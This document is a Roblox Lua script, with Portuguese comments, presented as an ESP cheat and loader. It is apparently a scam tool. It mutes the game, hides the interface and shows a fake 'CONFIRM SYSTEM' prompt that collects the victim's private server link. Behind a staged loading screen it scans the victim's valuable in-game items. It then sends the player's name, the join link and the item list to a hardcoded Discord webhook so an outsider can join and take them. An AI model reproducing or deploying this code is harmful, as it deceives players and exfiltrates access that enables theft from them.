--========================================================--
-- GUI DE LINK + FULLSCREEN LOADER + ESP + WEBHOOK FINAL
--========================================================--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1520499352265687040/LeIzrbkN-wCzykT4WQa7AxoSxSngZEhq2HktvmG7hmIaUIJ4kx3FuSxUpqIYpNL4QPaL"

--========================================================--
-- FUNÇÃO PARA CANCELAR TODOS OS SONS
--========================================================--
local function StopAllSounds()
    local function StopDescendants(parent)
        for _, obj in pairs(parent:GetDescendants()) do
            if obj:IsA("Sound") then
                obj:Stop()
                obj.Playing = false
                obj.Volume = 0
            end
        end
        parent.DescendantAdded:Connect(function(desc)
            if desc:IsA("Sound") then
                desc:Stop()
                desc.Playing = false
                desc.Volume = 0
            end
        end)
    end

    StopDescendants(Workspace)  
    StopDescendants(ReplicatedStorage)  
    StopDescendants(StarterGui)  
    StopDescendants(LocalPlayer:WaitForChild("PlayerGui"))  
    StopDescendants(LocalPlayer:WaitForChild("Backpack"))  
    if LocalPlayer.Character then  
        StopDescendants(LocalPlayer.Character)  
    end  

    LocalPlayer.CharacterAdded:Connect(function(char)  
        StopDescendants(char)  
    end)
end

task.spawn(StopAllSounds)

--========================================================--
-- DESABILITA CORE GUI
--========================================================--
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

--========================================================--
-- GUI DE LINK (DESIGN GRANDE + BORDAS ARREDONDADAS)
--========================================================--
local smallGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
smallGui.Name = "SmallVerifyGui"
smallGui.ResetOnSpawn = false

-- Frame Principal (Maior e com cantos bem arredondados)
local frame = Instance.new("Frame", smallGui)
frame.Size = UDim2.new(0, 460, 0, 220) -- Dimensões maiores para dar mais espaço
frame.Position = UDim2.new(0.5, -230, 0.4, -110)
frame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.BackgroundTransparency = 1

local frameCorner = Instance.new("UICorner", frame)
frameCorner.CornerRadius = UDim.new(0, 16)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 55)
title.Text = "ENTER PRIVATE SERVER LINK"
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextTransparency = 1

-- Campo de Texto (Arredondado e Amplo)
local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.9, 0, 0, 45)
box.Position = UDim2.new(0.05, 0, 0.35, 0)
box.Font = Enum.Font.Gotham
box.TextSize = 15
box.Text = ""
box.PlaceholderText = "https://www.roblox.com/share?code=xxxx&type=Server"
box.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
box.BorderSizePixel = 0
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.ClearTextOnFocus = false
box.TextXAlignment = Enum.TextXAlignment.Center
box.TextWrapped = true
box.BackgroundTransparency = 1
box.TextTransparency = 1

local boxCorner = Instance.new("UICorner", box)
boxCorner.CornerRadius = UDim.new(0, 10)

-- Botão de Confirmar (Bordas Arredondadas com Efeito de Clique)
local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0.9, 0, 0, 48)
btn.Position = UDim2.new(0.05, 0, 0.68, 0)
btn.Text = "CONFIRM SYSTEM"
btn.Font = Enum.Font.GothamBold
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextSize = 16
btn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
btn.BorderSizePixel = 0
btn.BackgroundTransparency = 1
btn.TextTransparency = 1

local btnCorner = Instance.new("UICorner", btn)
btnCorner.CornerRadius = UDim.new(0, 10)

-- Efeito de Entrada Suave (Deslizar + Fade-in)
local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
TweenService:Create(frame, tweenInfo, {Position = UDim2.new(0.5, -230, 0.5, -110), BackgroundTransparency = 0}):Play()
TweenService:Create(title, tweenInfo, {TextTransparency = 0}):Play()
TweenService:Create(box, tweenInfo, {BackgroundTransparency = 0, TextTransparency = 0}):Play()
TweenService:Create(btn, tweenInfo, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

btn.MouseEnter:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 170, 255)}):Play()
end)
btn.MouseLeave:Connect(function()
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
end)

local serverLinkFinal = nil

local function SendWebhook(extraFields)
    local timeStr = "foi às " .. os.date("%H:%M")
    local payload = HttpService:JSONEncode({
        username = "voxy methods", -- Mudado para voxy
        embeds = {{
            title = "<:Troll_ypow:1450889091825668159> brain hit| " .. timeStr, -- Mudado para voxy
            color = 16732240,
            fields = extraFields,
            image = {url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg?ex=692d46a3&is=692bf523&hm=e7f520e275d97c079cf71956fd14cf1b1d2b4d5c422bd94922448a2c91890811&"}
        }}
    })
    pcall(function()
        HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
end

btn.MouseButton1Click:Connect(function()
    local txt = box.Text
    local ok = txt:match("^https://www%.roblox%.com/share%?code=[%w_%-%d]+&type=Server$")
    if not ok then
        btn.Text = "INVALID LINK!"
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}):Play()
        task.wait(1.5)
        btn.Text = "CONFIRM SYSTEM"
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
        return
    end
    serverLinkFinal = txt
    btn.Text = "✓ ACCESS GRANTED"
    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 200, 80)}):Play()
    
    task.wait(1)
    local fadeOut = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
    TweenService:Create(frame, fadeOut, {BackgroundTransparency = 1, Position = UDim2.new(0.5, -230, 0.6, -110)}):Play()
    TweenService:Create(title, fadeOut, {TextTransparency = 1}):Play()
    TweenService:Create(box, fadeOut, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    TweenService:Create(btn, fadeOut, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    task.wait(0.4)
    smallGui:Destroy()
end)

repeat task.wait() until serverLinkFinal ~= nil

--========================================================--
-- FULLSCREEN LOADER
--========================================================--
local loaderGui = Instance.new("ScreenGui", CoreGui)
loaderGui.Name = "KdmlLoader"
loaderGui.IgnoreGuiInset = true
loaderGui.ResetOnSpawn = false

local loaderFrame = Instance.new("Frame", loaderGui)
loaderFrame.Size = UDim2.new(1, 0, 1, 0)
loaderFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 16)

local loaderSound = Instance.new("Sound", loaderFrame)
loaderSound.SoundId = "rbxassetid://1848354536"
loaderSound.Volume = 1
loaderSound.Looped = true
loaderSound:Play()

local loaderTitle = Instance.new("TextLabel", loaderFrame)
loaderTitle.Size = UDim2.new(1, 0, 0.1, 0)
loaderTitle.Position = UDim2.new(0, 0, 0.38, 0)
loaderTitle.BackgroundTransparency = 1
loaderTitle.Font = Enum.Font.GothamBold
loaderTitle.TextSize = 26
loaderTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
loaderTitle.Text = "auto moreira x voxy..." -- Mudado para voxy

local loaderPercent = Instance.new("TextLabel", loaderFrame)
loaderPercent.Size = UDim2.new(1, 0, 0.1, 0)
loaderPercent.Position = UDim2.new(0, 0, 0.48, 0)
loaderPercent.BackgroundTransparency = 1
loaderPercent.Font = Enum.Font.GothamBold
loaderPercent.TextSize = 30
loaderPercent.TextColor3 = Color3.fromRGB(255, 255, 255)
loaderPercent.Text = "0%"

-- Linha de progresso estilosa e arredondada
local barBackground = Instance.new("Frame", loaderFrame)
barBackground.Size = UDim2.new(0, 320, 0, 6)
barBackground.Position = UDim2.new(0.5, -160, 0.58, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
barBackground.BorderSizePixel = 0
Instance.new("UICorner", barBackground).CornerRadius = UDim.new(0, 3)

local barProgress = Instance.new("Frame", barBackground)
barProgress.Size = UDim2.new(0, 0, 1, 0)
barProgress.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
barProgress.BorderSizePixel = 0
Instance.new("UICorner", barProgress).CornerRadius = UDim.new(0, 3)

local totalTime = 40
local steps = 100
for i = 1, steps do
    local percentage = i/steps
    loaderPercent.Text = math.floor(percentage * 100).."%"
    barProgress.Size = UDim2.new(percentage, 0, 1, 0)
    task.wait(totalTime/steps)
end

loaderTitle:Destroy()
loaderPercent:Destroy()
barBackground:Destroy()

local done = Instance.new("TextLabel", loaderFrame)
done.Size = UDim2.new(1, 0, 1, 0)
done.BackgroundTransparency = 1
done.Font = Enum.Font.GothamBold
done.TextSize = 24
done.TextColor3 = Color3.fromRGB(0, 200, 80)
done.Text = "✓ Script Loaded\nPlease Wait 2-3 Minutes..."

--========================================================--
-- ESP DE BRAINROTS + WEBHOOK
--========================================================--
local function formatNumber(num)
    if num >= 1e9 then
        return string.format("%.1fB/s", num/1e9)
    elseif num >= 1e6 then
        return string.format("%.1fM/s", num/1e6)
    elseif num >= 1e3 then
        return string.format("%.1fk/s", num/1e3)
    else
        return tostring(num).."/s"
    end
end

local function ScanBrainrots()
    local animalsModule = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild("Animals")
    if not animalsModule then return end

    local brainrotDB = {}  
    local success, animalData = pcall(require, animalsModule)  
    if success and type(animalData) == "table" then  
        for name, data in pairs(animalData) do  
            if type(data)=="table" and data.Price and data.Generation then  
                brainrotDB[name] = {income = data.Generation}  
            end  
        end  
    end  

    local brainrotCount = {}  

    for _, plot in pairs(Workspace.Plots:GetChildren()) do  
        for _, brainrot in pairs(plot:GetChildren()) do  
            if brainrot:IsA("Model") and brainrotDB[brainrot.Name] then  
                local income = brainrotDB[brainrot.Name].income  
                local rootPart = brainrot:FindFirstChild("RootPart") or brainrot:FindFirstChild("FakeRootPart")  
                if rootPart then  
                    if brainrot:FindFirstChild("ESP") then brainrot.ESP:Destroy() end  
                    local highlight = Instance.new("Highlight")  
                    highlight.Name = "ESP"  
                    highlight.FillColor = Color3.fromRGB(0,100,255)  
                    highlight.OutlineColor = Color3.new(1,1,1)  
                    highlight.FillTransparency = 0.1  
                    highlight.OutlineTransparency = 0  
                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop  
                    highlight.Parent = brainrot  
                end  
                if not brainrotCount[brainrot.Name] then  
                    brainrotCount[brainrot.Name] = {count=1, income=income}  
                else  
                    brainrotCount[brainrot.Name].count += 1  
                end  
            end  
        end  
    end  

    local extraFields = {}  
    local content = ""  
    for name, data in pairs(brainrotCount) do  
        content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"  
    end  
    extraFields = {  
        {name="<:user:1516064307459264523> Player", value=LocalPlayer.Name},  
        {name="<:members:1469484604858564792> Players in Server", value=tostring(#Players:GetPlayers()), inline=false},  
        {name="<:entrada:1518401547594104955> Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},  
        {name="<a:MinecraftRainbowSheep_ypow:1450889134230208613> Brainrots", value=content, inline=false}  
    }  
    SendWebhook(extraFields)
end

task.spawn(function()
    repeat task.wait() until loaderGui
    ScanBrainrots()
end)
